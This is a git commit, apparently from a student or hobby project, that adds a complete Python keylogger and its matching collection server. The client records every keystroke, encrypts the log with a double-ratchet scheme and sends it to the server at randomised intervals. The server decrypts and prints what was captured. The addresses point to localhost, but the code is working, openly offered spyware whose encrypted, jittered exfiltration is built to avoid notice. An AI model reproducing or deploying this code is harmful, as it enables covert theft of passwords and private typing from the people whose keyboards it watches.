40b20d05a1d78ab0a17f13bd02fd469fa6df1127
Héctor <hectorpadin1>
2023-05-06 13:00:11 +0200

    Encryption done.

---
+++ keylogger.py
@@ -0,0 +1,139 @@
+#!/usr/bin/env python3
+from pynput import keyboard
+from threading import Timer
+from time import sleep
+import socket
+import errno
+import double_ratchet
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import dh
+from cryptography.hazmat.backends import default_backend
+from requests import Session
+import random
+import sys
+
+
+HEADER_LENGTH = 24
+
+class Keylogger:
+
+    def __init__(self, interval, ip, port, h_length):
+        self.interval = interval
+        self.ip = ip
+        self.port = port
+        self.header_lenght = h_length
+        self.log = ""
+        self.client_socket = None
+        self.__r = double_ratchet.Ratchet()
+        self.__start_connection()
+        self.__s = Session()
+        self.__pair_pkey()
+        
+    def __start_connection(self):
+        # starting socket based connection
+        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.client_socket.connect((self.ip, self.port))
+        self.client_socket.setblocking(False)
+        # send public key to pair the connection
+        usr_hlenght = f"{len(self.__r.getPublicKey().decode('utf-8')):<{self.header_lenght}}".encode('utf-8')
+        self.client_socket.send(usr_hlenght + self.__r.getPublicKey())
+
+    def __pair_pkey(self):
+        # update the public key of the server
+        sleep(3)
+        r = self.__s.get(f"http://localhost:8080/message.txt")
+        clavepublica = bytes(r.text, 'ascii')
+        dhpublica: dh.DHPublicKey = serialization.load_pem_public_key(clavepublica, backend=default_backend())
+        self.__r.pairComm(dhpublica)
+
+    # function to add the pressed keys to the current ones
+    def __append_to_log(self, string):
+        self.log = self.log + string
+
+    # process the pressed key
+    def __process_pressed_key(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            elif key == key.tab:
+                current_key = "\t"
+            elif key == key.enter:
+                current_key = "\n"
+            else:
+                current_key = "<" + str(key) + ">"
+        self.__append_to_log(current_key)
+
+    def __send_2_server(self):
+        # if no keys were pressed, do nothing
+        if self.log != "":
+            message = self.log
+            # encrypt the pressed keys
+            cifrado = self.__r.encrypt(message)
+            message_header = f"{len(cifrado):<{self.header_lenght}}".encode('utf-8')
+            msg = message_header + cifrado
+            # send the encrypted keys to the server
+            self.client_socket.send(msg)
+            sleep(3)
+            self.__pair_pkey()
+            usr_hlenght = f"{len(self.__r.getPublicKey().decode('utf-8')):<{self.header_lenght}}".encode('utf-8')
+            self.client_socket.send(usr_hlenght + self.__r.getPublicKey())
+        try:
+            while True:
+                username_header = self.client_socket.recv(self.header_lenght)
+                if not len(username_header):
+                    raise ConnectionError
+                message_header = self.client_socket.recv(self.header_lenght)
+                message_length = int(message_header.decode('utf-8').strip())
+                message = self.client_socket.recv(message_length).decode('utf-8')
+                self.client_socket.close()
+        except IOError as e:
+            if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
+                print(f'Reading error: {str(e)}')
+                raise ConnectionError
+
+    # function to send the user input in the given interval
+    def __report(self):
+        r = random.randint(0, 10)
+        self.__send_2_server()
+        self.log = ""
+        timer = Timer(self.interval+r, self.__report)
+        timer.start()
+        # cada cierto tiempo hay que actualizar mover el ratchet del servidor!!!
+
+    def start(self):
+        # listening 2 the user input
+        self.__keyboard_listener = keyboard.Listener(on_press=self.__process_pressed_key)
+        with self.__keyboard_listener:
+            # starts sending keys to server
+            try:
+                self.__report()
+            except ConnectionError:
+                self.__keyboard_listener.join()
+            # waiting the listener to finish
+            self.__keyboard_listener.join()
+    
+    def exit(self):
+        usr_hlenght = f"{len('close'.encode('utf-8')):<{self.header_lenght}}".encode('utf-8')
+        self.client_socket.send(usr_hlenght)
+        # close the socket
+        self.client_socket.close()
+        # exit the program
+        self.__keyboard_listener.stop()
+        sys.exit()
+
+
+random.seed(10)
+while (True):
+    try:
+        # adding a print interval of a min of 5 seconds
+        keylogger = Keylogger(10, "127.0.0.1", 11234, HEADER_LENGTH)
+        # starting the keyloggger
+        keylogger.start()
+    except ConnectionError as e:
+        print(e)
+        sleep(3)
+        continue
+    except KeyboardInterrupt:
+        keylogger.exit()
---
+++ server.py
@@ -0,0 +1,122 @@
+#!/usr/bin/env python3
+import socket
+import threading as t
+from datetime import datetime
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import dh
+from cryptography.hazmat.backends import default_backend
+import double_ratchet
+import subprocess
+
+
+# Global variables
+HEADER_LENGTH = 24
+hostName = "localhost"
+serverPort = 8080
+
+
+def start(hostName, serverPort):
+    subprocess.run(["python3", "-m", "http.server", str(serverPort), "--bind", hostName])
+
+
+class Server:
+
+    def __init__(self, ip, port):
+        self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.__server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.__server_socket.bind((ip, port))
+        self.__client = None
+        self.__r = double_ratchet.Ratchet()
+        self.__peer_key = None
+        msg = f'\nPython3 Server started on {socket.gethostname()} at {datetime.now().strftime("%H:%M:%S %b-%d-%Y")}.\n\nListening for connections on {ip}:{port}...\n\n'
+        print(msg)
+
+    def exit(self):
+        self.__client[0].close()
+        self.__server_socket.close()
+        print("\nClosing server...")
+
+    def __pair_pkey(self, data):
+        pubkey = data.split(b'\n-----END PUBLIC KEY-----')[0] + b'\n-----END PUBLIC KEY-----'
+        dhpublica: dh.DHPublicKey = serialization.load_pem_public_key(pubkey, backend=default_backend())
+        self.__r.pairComm(dhpublica)
+        self.__peer_key = pubkey
+
+    def __receive_message(self, client_socket):
+        try:
+            # receive our "header" containing message length, it's size is defined and constant
+            message_header = client_socket.recv(HEADER_LENGTH)
+            if not len(message_header):
+                return
+            # receive a new pairing key
+            if self.__peer_key is None:
+                message_length = int(message_header.decode('utf-8').strip())
+                data = client_socket.recv(message_length)
+                self.__pair_pkey(data)
+            # receive a new message
+            else:
+                message_length = int(message_header.decode('utf-8').strip())
+                return {'header': message_header, 'data': client_socket.recv(message_length)}
+        except Exception:
+            return False
+
+    def __write_message(self, msg):
+        #open a file in web root and write the next key
+        with open('message.txt', 'w') as f:
+            f.write(msg)
+    
+    def __handle_close(self, username):
+        log = f"Closed connection from: {username}"
+        print(log)
+        self.__client = None
+        self.__r = double_ratchet.Ratchet()
+        self.__peer_key = None
+        subprocess.run(["rm", "message.txt"])
+
+
+    def start(self):
+        try:
+            # start web server
+            t.Thread(target=start, args=(hostName, serverPort)).start()
+            # start listening for incomming connections
+            self.__server_socket.listen()
+            while True:
+                if self.__client is None:
+                    # accept new connection
+                    self.__client = self.__server_socket.accept()
+                    # receive new pairing key
+                    self.__receive_message(self.__client[0])
+                    address = str(self.__client[1]).replace('(', '').replace(')', '').replace(',', ':').replace('\'', '')
+                    print('Pairing key received from '+address+'.')
+                    # send own pairing key
+                    self.__write_message(self.__r.getPublicKey().decode('utf-8'))
+                else:
+                    username = self.__client[1]
+                    message = self.__receive_message(self.__client[0])
+                    if message is None:
+                        continue
+                    elif message is False:
+                        self.__handle_close(username)
+                        continue
+                    elif self.__peer_key is None:
+                        # update the current pairing key for ratchet
+                        self.__pair_pkey(message["data"])
+                        # update servers pairing key
+                        self.__write_message(self.__r.getPublicKey().decode('utf-8'))
+                    else:
+                        # decrypt message
+                        try:
+                            msg = self.__r.decrypt(message["data"])
+                            msg = f'Received message from {username}: {msg}'
+                            print(msg)
+                            self.__peer_key = None
+                            self.__r.updateDH()
+                            self.__write_message(self.__r.getPublicKey().decode('utf-8'))
+                        except Exception:
+                            self.__handle_close(username)
+        except KeyboardInterrupt:
+            self.exit()
+
+
+server = Server("127.0.0.1", 11234)
+server.start()
